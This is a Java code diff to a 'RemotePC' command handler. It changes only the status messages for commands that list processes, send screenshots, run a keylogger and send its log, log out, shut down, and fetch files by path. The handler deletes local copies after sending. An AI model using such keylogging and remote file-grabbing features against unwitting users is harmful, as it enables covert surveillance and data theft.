@@ -151,7 +151,7 @@ public class RemotePC {
           {
             ServerThreading.fileDemo = readFile("process.txt");
             System.out.println("list process");
-            return "The process.txt file was sent successfully";
+            return "The process.txt was sent successfully";
           }
           else return "list process failed!";
         }
@@ -181,9 +181,9 @@ public class RemotePC {
 
         if (send.sendFile(message[1]))
         {
-          System.out.println("Send  suscessfull");
+          System.out.println("Send suscessfull");
           deleteFile(message[1]);
-          return "screenshot " + message[1] + " was sent successfully";
+          return "screenshot was sent successfully";
         }
         else return "screenshot was not sent successfully";
         //break;
@@ -207,9 +207,9 @@ public class RemotePC {
             {
               System.out.println("stop keylog");
               deleteFile("keylog.txt");
-              return "keylog stopped. keylog.txt was sent successfully";
+              return "keylog.txt was sent successfully";
             }
-            else return "keylog stopped. But keylog.txt was not sent successfully";
+            else return "keylog.txt was not sent successfully";
           } else {
             System.out.println("keylog is not running");
             return "keylog is not running";
@@ -218,12 +218,12 @@ public class RemotePC {
         //break;
       case "logout":
         process.logout();
-        System.out.println("logout suscessfull");
-        return "logout in the next 1 hour";
+        System.out.println("logout suscessfully");
+        return "logout suscessfully";
         //break;
       case "shutdown":
         process.shutdown();
-        System.out.println("shutdown suscessfull");
+        System.out.println("shutdown suscessfully");
         return "shutdown in the next 1 hour";
         //break;
       case "getfile":
@@ -238,13 +238,13 @@ public class RemotePC {
         if (send.sendFile(path))
         {
           System.out.println("get file suscessfull");
-          return "File was sent successfully";
+          return "Requested file was sent successfully";
         }
         else return "File error!";
         //break;
       default:
         System.out.println("command not found");
-        return message + " not found";
+        return "Command not found !!!";
         //break;
     }
   }
